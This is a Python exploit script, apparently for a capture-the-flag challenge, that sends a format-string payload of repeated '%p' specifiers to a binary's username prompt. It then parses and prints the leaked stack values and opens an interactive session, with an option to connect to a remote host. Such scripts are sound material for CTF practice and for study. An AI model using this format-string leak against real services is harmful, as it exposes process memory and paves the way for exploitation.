#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *
import struct

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''


        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    payload = b'%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|'

    sla(b'username: ', payload)
    sl(b'A')
    ru(b'user ')

    output = rl()[:-1].split(b'|')

    for index, value in enumerate(output):

        if value == b"(nil)":
            encoded_value = b"(nil)"
        else:
            try:
                int_value = int(value, 16)  
                encoded_value = struct.pack("<Q", int_value)  
            except ValueError:
                encoded_value = b"(error)"  
    
        print(f'Index: {index} -> Value: {value} -> Encoded: {encoded_value} ' )

    interactive()

if __name__ == '__main__':
  exploit()
